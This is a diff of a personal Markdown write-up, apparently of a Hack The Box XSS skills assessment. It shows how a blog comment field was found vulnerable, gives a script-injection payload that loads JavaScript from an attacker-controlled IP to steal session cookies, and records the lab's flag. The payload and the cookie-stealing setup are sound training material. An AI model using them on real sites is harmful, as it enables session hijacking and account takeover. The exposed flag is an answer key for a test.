@@ -1,14 +1,11 @@
 ---
 sticker: lucide//code
 ---
+We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
 
-# Skills Assessment
+Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:
 
-We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
-
-Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:
-
-&#x20; &#x20;
+   
 
 ![](https://academy.hackthebox.com/storage/modules/103/xss_skills_assessment_website.jpg)
 
@@ -16,21 +13,21 @@ Apply the skills you learned in this module to achieve the following:
 
 1. Identify a user-input field that is vulnerable to an XSS vulnerability
 2. Find a working XSS payload that executes JavaScript code on the target's browser
-3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag
+3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag
 
-#### Identifying the vulnerable parameter
 
-***
+### Identifying the vulnerable parameter
+---
 
 Once we go into the website we can see the following:
 
-!\[]\(Pasted image 20250130180314.png)
+![](Pasted image 20250130180314.png)
 
 If we go to the `Welcome to Security Blog` URL, we can see the following:
 
-!\[]\(Pasted image 20250130180344.png)
+![](Pasted image 20250130180344.png)
 
-At first glance, the comments section seems vulnerable to XSS, let's test some simple payload to check the behavior of the web application, we can set up the same PHP server form the \[\[CYBERSECURITY/Bug Bounty/HTB BUG BOUNTY HUNTER PATH/CROSS-SITE SCRIPTING (XSS)/XSS Attacks/Session Hijacking.md|Session Hijacking]] section:
+At first glance, the comments section seems vulnerable to XSS, let's test some simple payload to check the behavior of the web application, we can set up the same PHP server form the [[CYBERSECURITY/Bug Bounty/HTB BUG BOUNTY HUNTER PATH/CROSS-SITE SCRIPTING (XSS)/XSS Attacks/Session Hijacking.md|Session Hijacking]] section:
 
 ```php
 <?php  
@@ -57,7 +54,7 @@ We can send the payloads in each section to check which one is vulnerable:
 "><script src=http://10.10.15.141/script.js></script>
 ```
 
-!\[]\(Pasted image 20250130181138.png)
+![](Pasted image 20250130181138.png)
 
 After a bit, we'll get the following in our server:
 
@@ -76,4 +73,5 @@ After a bit, we'll get the following in our server:
 
 We got the flag: `HTB{cr055_5173_5cr1p71n6_n1nj4}`
 
-!\[]\(Pasted image 20250130181248.png)
+![](Pasted image 20250130181248.png)
+
